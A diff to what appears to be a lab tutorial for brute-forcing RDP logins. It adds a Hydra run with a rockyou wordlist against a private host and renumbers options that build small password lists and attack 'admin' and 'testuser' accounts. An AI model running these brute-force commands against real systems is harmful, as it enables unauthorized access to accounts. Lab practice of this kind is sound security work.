@@ -57,7 +57,13 @@ nmap -p 3389 192.168.1.5
 
 ### 2.2 Run Hydra Brute Force Attack
 
-**Option A: Quick Test (Recommended for first try)**
+**Option A: Using rockyou wordlist**
+```bash
+# Run Hydra with rockyou wordlist
+hydra -l testuser -P ~/rockyou_100.txt -t 1 -W 3 rdp://192.168.1.5
+```
+
+**Option B: Quick Test (Recommended for first try)**
 ```bash
 # Create a small wordlist for testing
 echo -e "password\n123456\nadmin\npassword123\ntest\nTestPass123!" > /tmp/small_wordlist.txt
@@ -66,7 +72,7 @@ echo -e "password\n123456\nadmin\npassword123\ntest\nTestPass123!" > /tmp/small_
 hydra -l admin -P /tmp/small_wordlist.txt rdp://192.168.1.5 -t 4 -V
 ```
 
-**Option B: Use Existing Account (if you created testuser)**
+**Option C: Use Existing Account (if you created testuser)**
 ```bash
 # Try to brute force the testuser account
 echo -e "password\n123456\nTestPass123!\nadmin\ntest" > /tmp/small_wordlist.txt
